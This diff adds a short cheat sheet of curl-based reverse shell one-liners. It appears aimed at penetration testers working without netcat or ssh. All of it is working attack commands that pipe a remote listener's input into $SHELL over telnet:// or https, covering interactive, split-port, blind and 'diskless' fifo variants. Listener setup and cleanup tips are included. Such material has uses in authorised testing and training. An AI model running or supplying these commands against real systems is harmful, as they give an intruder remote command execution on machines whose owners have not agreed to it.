@@ -1,0 +1,43 @@
+Reverse shell using curl
+===============================
+Useful if there is no telnet, ssh, netcat, openssl etc..
+
+TODO:
+  Figure out a way to use `exec` with `fd` redirection
+
+NOTE:
+  $SHELL is a env variable. You can use it as is in most cases ;)
+
+* Interactive
+-------------------------------
+  ** `rm -f /tmp/f` before killing the shell, otherwise it will leave behind all command output **
+
+  [server]$ nc -vl PORT
+  [client]$ curl -sN telnet://SERVER:PORT < /tmp/f | $SHELL > /tmp/f
+
+
+* Interactive in/out ports
+-------------------------------
+  [server]$ nc -vl CMDP // cmd port
+  [server]$ nc -vl COUT // cmd output port
+  [client]$ curl -sN telnet://SERVER:CMDP <<< 'Ready..'| $SHELL |curl -sN telnet://SERVER:COUT
+
+
+* Blind
+-------------------------------
+  ** Commands are executed after ^C exit **
+
+  [server]$ nc -vl PORT
+   or
+  [server]$ nc -vl PORT < cmds.txt
+  [client]$ curl -sN telnet://SERVER:PORT <<< 'Feed me..'| $SHELL
+
+
+* Other (un-tested)
+-------------------------------
+https://twitter.com/joevennix/status/1258613994681544704
+
+P=$(mktemp -u);mkfifo $P;curl -sNkT . https://$LHOST:$LPORT<$P|sh>$P
+(diskless on linux):
+{ curl -sNkT . https://$LHOST:$LPORT </dev/fd/3| sh 3>&-;} 3>&1|:
+
